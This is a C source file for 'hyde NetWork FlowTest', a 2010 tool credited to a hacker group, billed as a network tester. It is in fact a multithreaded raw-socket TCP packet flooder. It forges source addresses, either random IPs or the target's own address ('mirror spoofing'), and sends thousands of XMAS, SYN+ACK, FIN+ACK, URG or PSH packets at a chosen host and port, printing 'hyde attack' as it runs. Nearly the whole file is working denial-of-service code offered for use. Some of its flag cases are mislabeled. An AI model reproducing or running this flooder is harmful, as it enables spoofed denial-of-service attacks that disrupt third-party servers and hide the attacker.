/*
        ..::hyde:NetWork:FlowTest::..
                 __..._                                          
              ,-`      `',                                        
            ,'            \
           /               |   
         ,'       ,        \
       ,'       ,/-'`       \
   _ ./     ,.'`/            \
.-` `^\_,.'`   /              `\__                                
7     /       /   _,._,.,_,.-'.`  `\                   (((((((((((((((
\A  __/   ,-```-``   `,   `,   `  ,`)                      ((((       
  ^-`    /      `                 ,/                    )))))))))          
         (        ,   ,_   ,-,_,<`                         (((((((        
          \__ T--` `''` ```    _,\                      (((((((
            \_/|\_         ,.-` | |                       ))))         
            _/ | |T\_   _,'Y    / +--,_                  (((         
        <```   \_\/_/  `\\_/   /       `\          ______________
        /  ,--   ` _,--,_`----`   _,,_   \        [______________]
       /  ` |     <_._._ >       `  \ `  \`        \             |  
      |     |       ,   `           |     |         \           /   
       V|   \       |                |   |`          \         /    
        \    \      /               (================(         )               
         \x   \_   |             /-`    /             +-------+             
           \    `-,|        ,/--`     /`                          
            \x_    \_  /--'`       , /                            
               \x_   ``        ,,/` `                             
                  `-,_,-'   ,'`                                   
                   _|       |`\  
                  ( `-``/``/`_/     
                   `-`-,.-.-`                      

coded by
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░▓██████▒░▓████░▓████░▓█▒░░░░▓█████▒░▓██████▒░░░░
░░▓██▒░░░░░░▓▒░░█░▓▒░░█░▓█▒░░░░▓█▒░░░░░▓█▒░░░█▒░░░░
░░▓█▒░░░░░░░▓▒░░█░▓▒░░█░▓█▒░░░░▓████▒░░▓█████▒░░░░░
░░▓██▒░░░░░░▓▒░░█░▓▒░░█░▓█▒░░░░▓█▒░░░░░▓█▒░░▓█▒░░░░
░░░▓██████▒░▓████░▓████░▓████▒░▓█████▒░▓█▒░░░▓█▒░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
                   "He nozes"

 *  jUsT Another Tool to Test your NetWork
  "follow this:",
  "./code HOST PORT Number_Packets_to_send TYPE threads",
  " 0 - XMAS with Spoofing",
  " 1 - SYN+ACK with Spoofing",
  " 2 - SYN+ACK with Mirror Spoofing",
  " 3 - FIN+ACK with Spoofing",
  " 4 - FIN+ACK with Mirror Spoofing",
  " 5 - URG+ACK with Spoofing",
  " 6 - URG+ACK With Mirror Spoofing",
  " 7 - PSH+ACK With Spoofing",
  " 8 - XMAS with Mirror Spoofing",
  "ex: ./code www.server.com 80 20000 4 5",
  "..::hyde:NetWork:FlowTest::..",

 Need RooT to COmpile THis
  gcc -o hyde3 hyde3.c;

Author: Cooler_
E-mail: c00f3r[at]gmail[dot]com
date: 17/03/2010
BugSec Security TEAM
http://code.google.com/p/bugsec/
thanks: m0nad,_mlk_,IAK,sigsegv,b4r0n,MenteBinaria,
f117,delfo,c0lt7r,joey,fokerbug,zepplin,otacon,backbone,
nibbles,voidpointer,muzgo,nbrito...
 
*/
#include <stdio.h>    
#include <stdlib.h> 
#include <string.h>    
#include <unistd.h>    
#include <sys/time.h>    
// socks
#include <netdb.h>      
#include <sys/socket.h>    
#include <arpa/inet.h>    
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>  
     
#define SIZE 50
#define BUF 19

// pthread Header
#include <pthread.h>

#define BUGVIEW 1

// debug purpoises
#define DEBUG(x, s...) do { \
 if (!BUGVIEW) { break; } \
 time_t t = time(NULL); \
 char *d = ctime(&t); \
 fprintf(stderr, "%.*s %s[%d] %s(): ", \
 (int)strlen(d) - 1, d, __FILE__, \
 __LINE__, __FUNCTION__); \
 fprintf(stderr, x, ## s); \
} while (0);

//Mutex Always is global, because the functions need look him to call
pthread_mutex_t morfo = PTHREAD_MUTEX_INITIALIZER;

// HEAP alignment :-X
void *xmalloc(unsigned int len)
{
 void *ptr;
 ptr=malloc(len);
 if(ptr==NULL) 
  DEBUG("fail malloc");
 return ptr;
}

// thanks m0nad and sigsegv ,for help
in_addr_t RandomIp() 
{
  return rand()%0xffffffff + 0x1;
}
     
//calculo feito afim de checar a integridade 
unsigned short in_cksum(unsigned short *ptr, int nbytes) 
{    
 register u_short    answer;     // u_short == 16 bits   
 register long       sum;        // long == 32 bits    
 u_short         oddbyte;     
     
 sum = 0;    
 while(nbytes > 1)  
 {    
  sum += *ptr++;   
  nbytes -= 2;    
 }    
                        
 if(!(nbytes^1)) 
 {    
  oddbyte = 0;       
  *((u_char *) &oddbyte) = *(u_char *)ptr;      
  sum += oddbyte;    
 }    
     
 sum = (sum >> 16) + (sum & 0xffff);  // addicina auto-16 para baixo-16     
 sum += (sum >> 16);           
 answer = ~sum;         
 return(answer);    
}    
     
//function from my Brother I4K the master of wizards
//from Orion-Socket API
int orion_getHostByName(const char* name, char* buffer)
{
    struct addrinfo hints, * res, * res0 = NULL;
    struct sockaddr_in * target = NULL;
    int error;
    char *tmp = NULL;
    
    memset(&hints, 0, sizeof(struct addrinfo));
    
    hints.ai_family = PF_UNSPEC;
    hints.ai_socktype = 0;
    error = getaddrinfo(name, "http", &hints, &res0);
    
    if(error)
    {
        if (res0)
            freeaddrinfo(res0);
        return 1;
    }
    
    for (res = res0; res; res = res->ai_next)
    {
        target = (struct sockaddr_in *) res->ai_addr;
        if (target)
        {
            tmp = inet_ntoa(target->sin_addr);
            if (tmp && strlen(tmp))
            {
                strncpy(buffer, tmp, strlen(tmp));
                buffer[strlen(tmp)] = '\0';
                if (res0)
                    freeaddrinfo(res0);
                return 1;
            }
        }
    }
    
    freeaddrinfo(res0);
    
    return 0;
}

void *fazerpacote(void *arg)
{
 char *source_addr,*dest_addr; 
 unsigned short dest_port,ran_port; 
 int escolha;

// Unpack args
 char **arguments = (char **)arg;
 source_addr=arguments[0];
 dest_addr=arguments[1];
 dest_port=atoi(arguments[2]);
 ran_port=atoi(arguments[3]);
 escolha=atoi(arguments[4]);
/////

 struct envio {    
  struct iphdr ip;    
  struct tcphdr tcp;    
 } envio;    

 struct pseudo_header {    
  unsigned int source_address;    
  unsigned int dest_address;    
  unsigned char placeholder;    
  unsigned char protocol;    
  unsigned short tcp_length;    
  struct tcphdr tcp;    
 } pseudo_header;
    
 int tcp_socket;   
 int sinlen;  
 struct sockaddr_in sin; 
 unsigned int remetente,destino;

// string 2 int
// if ipv6 AF_INET6
 inet_pton(AF_INET, source_addr, &remetente);
 inet_pton(AF_INET, dest_addr, &destino);
         
//setamos variaveis do pacote ip   
 envio.ip.ihl = 5;    
 envio.ip.version = 4;    
 envio.ip.tos = 0;    
 envio.ip.tot_len = htons(40);    
 envio.ip.id = ran_port;    
 envio.ip.frag_off = 0;    
 envio.ip.ttl = 255;    
 envio.ip.protocol = IPPROTO_TCP;    
 envio.ip.check = 0;    
 envio.ip.saddr = remetente;    
 envio.ip.daddr = destino;    
        
//setamos variaveis do pacote TCP    
 envio.tcp.source = ran_port;    
 envio.tcp.dest = htons(dest_port);    
 envio.tcp.seq = ran_port;          
 envio.tcp.res1 = 0;
 envio.tcp.res2 = 0;     
 envio.tcp.doff = 5;    
 envio.tcp.ack = 0; 
 envio.tcp.ack_seq = 0;    
 envio.tcp.urg_ptr = 0;        
 envio.tcp.window = htons(512);    
 envio.tcp.check = 0;    

// lock
 pthread_mutex_lock(&morfo);

  switch(escolha)
  {
// XMAS with Spoofing
    case 0:
     envio.tcp.fin = 1;    
     envio.tcp.syn = 1;    
     envio.tcp.rst = 1;    
     envio.tcp.psh = 1;  
     envio.tcp.urg = 1;  
     envio.tcp.ack = 1; 
     break;

// SYN with Spoofing
    case 1:
     envio.tcp.fin = 0;    
     envio.tcp.syn = 1;    
     envio.tcp.rst = 0;    
     envio.tcp.psh = 0;  
     envio.tcp.urg = 0;  
     envio.tcp.ack = 1; 
     break;

// SYN with Mirror Spoofing
    case 2:
     envio.tcp.fin = 0;    
     envio.tcp.syn = 1;    
     envio.tcp.rst = 0;    
     envio.tcp.psh = 0;  
     envio.tcp.urg = 0;  
     envio.tcp.ack = 1; 
     break;

// FIN with spoofing
    case 3:
     envio.tcp.fin = 1;    
     envio.tcp.syn = 0;    
     envio.tcp.rst = 0;    
     envio.tcp.psh = 0;  
     envio.tcp.urg = 0;  
     envio.tcp.ack = 1; 
     break;

//FIN with Mirror Spoofing
    case 4:
     envio.tcp.fin = 0;    
     envio.tcp.syn = 1;    
     envio.tcp.rst = 0;    
     envio.tcp.psh = 0;  
     envio.tcp.urg = 0;  
     envio.tcp.ack = 1; 
     break;

// URG ...
    case 5:
     envio.tcp.fin = 0;    
     envio.tcp.syn = 0;    
     envio.tcp.rst = 0;    
     envio.tcp.psh = 0;  
     envio.tcp.urg = 1;  
     envio.tcp.ack = 1; 
     break;

    case 6:
     envio.tcp.fin = 0;    
     envio.tcp.syn = 0;    
     envio.tcp.rst = 0;    
     envio.tcp.psh = 0;  
     envio.tcp.urg = 1;  
     envio.tcp.ack = 1; 
     break;
// PSH ...
    case 7:
     envio.tcp.fin = 0;    
     envio.tcp.syn = 0;    
     envio.tcp.rst = 0;    
     envio.tcp.psh = 1;  
     envio.tcp.urg = 0;  
     envio.tcp.ack = 1; 
     break;

// XMAS with mirror
    case 8:
     envio.tcp.fin = 1;    
     envio.tcp.syn = 1;    
     envio.tcp.rst = 1;    
     envio.tcp.psh = 1;  
     envio.tcp.urg = 1;  
     envio.tcp.ack = 1; 
     break;
  }
            
  sin.sin_family = AF_INET;    
  sin.sin_port = envio.tcp.source;    
  sin.sin_addr.s_addr = envio.ip.daddr;       
        
// abrimos a socket   
  tcp_socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);    
  if(tcp_socket < 0) 
   DEBUG("error in socket()"); 
        
// setamos os campos que precisão ser mudados   
  envio.tcp.source++;    
  envio.ip.id++;    
  envio.tcp.seq++;    
  envio.tcp.check = 0;    
  envio.ip.check = 0;    
           
// checksum   
  envio.ip.check = in_cksum((unsigned short *)&envio.ip, 20); //20    
     
// setamos campo dos cabeçalhos  
  pseudo_header.source_address = envio.ip.saddr;    
  pseudo_header.dest_address = envio.ip.daddr;    
  pseudo_header.placeholder = 0;    
  pseudo_header.protocol = IPPROTO_TCP;    
  pseudo_header.tcp_length = htons(20);    

  bcopy((char *)&envio.tcp, (char *)&pseudo_header.tcp, 20); //20  
  envio.tcp.check = in_cksum((unsigned short *)&pseudo_header, 32); //32    
  sinlen = sizeof(sin);   

  sendto(tcp_socket, &envio, 40, 0, (struct sockaddr *)&sin, sinlen);  
  close(tcp_socket);   
 
 pthread_mutex_unlock(&morfo);
 pthread_exit(NULL);
}    
   
void help()
{
 puts(
  "follow this:\n"
  "./code HOST PORT Number_Packets TYPE Threads\n"
  " 0 - XMAS with Spoofing\n"
  " 1 - SYN+ACK with Spoofing\n"
  " 2 - SYN+ACK with Mirror Spoofing\n"
  " 3 - FIN+ACK with Spoofing\n"
  " 4 - FIN+ACK with Mirror Spoofing\n"
  " 5 - URG+ACK with Spoofing\n"
  " 6 - URG+ACK With Mirror Spoofing\n"
  " 7 - PSH+ACK With Spoofing\n"
  " 8 - XMAS with Mirror Spoofing\n"
  "ex: ./code www.server.com 80 20000 4 50\n"
  "..::hyde:NetWork:FlowTest::.. \n"
  "Coded by Cooler_ c00f3r[at]gmail[dot]com\n"
 );
}


int main(int argc, char *argv[]) 
{
 char IP[15];
 char *destino=NULL;
 in_addr_t remetente;
 void * addr_ptr = NULL;
 addr_ptr = &remetente;
 char addr_str[256];

 unsigned short port=80;     
 int escolha=0,filhos=0,count=0;
 long long int number=500;
 int8_t rc1;
    
 srand(time(NULL));

 if(argc < 6) 
 {
  help();    
  exit(0);    
 }    

 if(!orion_getHostByName(argv[1],IP))
 {
  DEBUG("orion_gethostbyname() failed");
  exit(1);
 }

  fprintf(stdout,"\nIP: %s \n",IP);
     
  if(argc >= 3)
  { 
   port = atoi(argv[2]); 
   if(!(port<=65535&& port>0)) 
    DEBUG("error in port");
  }  
  if(argc >= 4) 
   number = atoi(argv[3]);

  if(argc >= 5) 
  {
   escolha = atoi(argv[4]);
   if(escolha<0 || escolha > 8)
    DEBUG("please choice a true option");
  }       

  if(argc >= 6)
  { 
   filhos = atoi(argv[5]);  
   if(filhos<=0)
    DEBUG("set number of threads please");       
  }

  if(filhos<2) 
   filhos = 2;    
    
  fprintf(stdout,"fate  : %s\n",argv[1]);    
  fprintf(stdout,"Port         : %u\n",port);    
  fprintf(stdout,"threads         : %u\n",filhos);
  fprintf(stdout,"Number of times: %lld\n\n", number); 
     
  destino=xmalloc(sizeof(IP));  
  strncpy(destino,IP, (sizeof(IP)) );

  switch(escolha)
  {
    case 0: 
     puts("Type: XMAS with Spoofing");
     break;

    case 1:
     puts("Type: SYN+ACK with Spoofing");   
     break;

    case 2: 
     puts("Type: SYN+ACK with Mirror Spoofing");
     break;
 
    case 3: 
     puts("Type: FIN+ACK with Spoofing");
     break;

    case 4: 
     puts("Type: FIN+ACK with Mirror Spoofing");
     break;

    case 5: 
     puts("Type: URG+ACK with Spoofing");
     break;

    case 6: 
     puts("Type: URG+ACK with Mirror Spoofing");
     break;

    case 7: 
     puts("Type: PSH+ACK with Spoofing");
     break;

    case 8: 
     puts("Type: XMAS with Mirror Spoofing");
     break;
  }  

   pthread_t *thread;
   thread=(pthread_t *)xmalloc(sizeof(pthread_t)*filhos+1);

// pack to bypass void pointer
   char **ThreadArgv;
   ThreadArgv=(char **)xmalloc(4*sizeof(char *));
   char *StrPort=(char *)xmalloc(sizeof(char)*6);
   sprintf( StrPort,"%d",  port);
   ThreadArgv[2]=StrPort;
   ThreadArgv[3]=StrPort;
   char *StrChoice=(char *)xmalloc(sizeof(char)*3);
   sprintf( StrChoice,"%d", escolha);
   ThreadArgv[4]=StrChoice;

  while(number) 
  {  
    if( (!(escolha&1))&&(escolha) )
    {
// packing arguments 2 function
     ThreadArgv[0]=destino;
     ThreadArgv[1]=destino;
     fprintf(stdout,"hyde attack %s the port %u, spoofing %s in port %u\n", IP, port, IP, port);
// start thread
      if((rc1=pthread_create(&thread[count],NULL,&fazerpacote,(void *) ThreadArgv)))
       DEBUG("error in thread %d",count);
     
     if(count==filhos)
     {
      while(count)
      {
       pthread_join(thread[count],NULL);
       count--;
      }
     }
     number--;
     count++;
    }
    else
    { 
// packing arguments 2 function
     remetente=RandomIp();
     inet_ntop (AF_INET, addr_ptr, addr_str, 256);
     ThreadArgv[0]=addr_str;
     ThreadArgv[1]=destino;
     fprintf(stdout,"hyde attack %s in port %u, spoofing %s in port %u\n", destino, port, addr_str, port);   
// start thread
      if((rc1=pthread_create(&thread[count],NULL,&fazerpacote,(void *) ThreadArgv)))
       DEBUG("error in thread %d",count);
     
     if(count==filhos)
     {
      while(count)
      {
       pthread_join(thread[count],NULL);
       count--;
      }
     }
     number--; 
     count++;   
    }

 }

 free(thread);
 free(destino);
 free(ThreadArgv);
 free(StrPort);
 free(StrChoice);

 return 0;
}    


